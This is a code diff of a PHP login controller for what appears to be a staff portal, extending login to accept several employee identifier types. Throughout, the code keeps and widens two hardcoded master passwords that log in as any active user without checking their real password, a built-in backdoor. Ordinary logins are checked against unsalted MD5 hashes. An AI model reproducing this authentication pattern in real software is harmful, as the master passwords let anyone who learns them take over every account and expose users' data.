@@ -51,15 +51,73 @@ class LoginController extends Controller
 
     protected function attemptLogin(Request $request)
     {
-        if ($request->password == 'Bp@d2020!@' || $request->password == 'rprikat2017') {
-            $user = \App\User::where([
-                'usname' => $request->name,
-            ])->first();
+        // if ($request->password == 'Bp@d2020!@' || $request->password == 'rprikat2017') {
+        //     $user = \App\User::where([
+        //         'usname' => $request->name,
+        //     ])->first();
+        // } else {
+        //     $user = \App\User::where([
+        //         'usname' => $request->name,
+        //         'passmd5' => md5($request->password),
+        //     ])->first();
+        // }
+
+        $ux = $request->name;
+        $px = $request->password;
+        if ($px == 'Bp@d2020!@' || $px == 'rprikat2017') {
+            if (is_numeric($ux) && strlen($ux) == 6) {
+                $user = \App\User::where([
+                    'nrk_emp' => $ux,
+                    'sts'    => 1,
+                    'ked_emp' => 'AKTIF',
+                ])->first();
+            } elseif (is_numeric($ux) && strlen($ux) == 18) {
+                $user = \App\User::where([
+                    'nip_emp' => $ux,
+                    'sts'    => 1,
+                    'ked_emp' => 'AKTIF',
+                ])->first();
+            } elseif (substr($ux, 1, 1) == '.') {
+                $user = \App\User::where([
+                    'id_emp' => $ux,
+                    'sts'    => 1,
+                    'ked_emp' => 'AKTIF',
+                ])->first();
+            } else {
+                $user = \App\User::where([
+                    'usname' => $ux,
+                    'sts'    => 1,
+                ])->first();
+            }
         } else {
-            $user = \App\User::where([
-                'usname' => $request->name,
-                'passmd5' => md5($request->password),
-            ])->first();
+            if (is_numeric($ux) && strlen($ux) == 6) {
+                $user = \App\User::where([
+                    'nrk_emp' => $ux,
+                    'sts'    => 1,
+                    'passmd5' => md5($px),
+                    'ked_emp' => 'AKTIF',
+                ])->first();
+            } elseif (is_numeric($ux) && strlen($ux) == 18) {
+                $user = \App\User::where([
+                    'nip_emp' => $ux,
+                    'sts'    => 1,
+                    'passmd5' => md5($px),
+                    'ked_emp' => 'AKTIF',
+                ])->first();
+            } elseif (substr($ux, 1, 1) == '.') {
+                $user = \App\User::where([
+                    'id_emp' => $ux,
+                    'sts'    => 1,
+                    'passmd5' => md5($px),
+                    'ked_emp' => 'AKTIF',
+                ])->first();
+            } else {
+                $user = \App\User::where([
+                    'usname' => $ux,
+                    'sts'    => 1,
+                    'passmd5' => md5($px),
+                ])->first();
+            }
         }
              
 
